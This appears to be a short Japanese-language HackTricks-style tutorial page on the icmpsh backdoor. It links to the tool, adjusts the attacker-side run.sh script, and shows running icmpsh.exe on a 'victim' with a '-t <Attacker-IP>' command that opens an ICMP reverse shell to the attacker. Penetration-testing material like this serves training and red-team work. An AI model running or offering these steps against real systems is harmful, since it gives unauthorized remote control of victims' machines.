{{#include ../banners/hacktricks-training.md}}

バックドアをダウンロードする: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# クライアント側

スクリプトを実行する: **run.sh**

**エラーが発生した場合は、行を変更してみてください:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**対象:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **被害者側**

**icmpsh.exe** を被害者にアップロードし、実行します:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
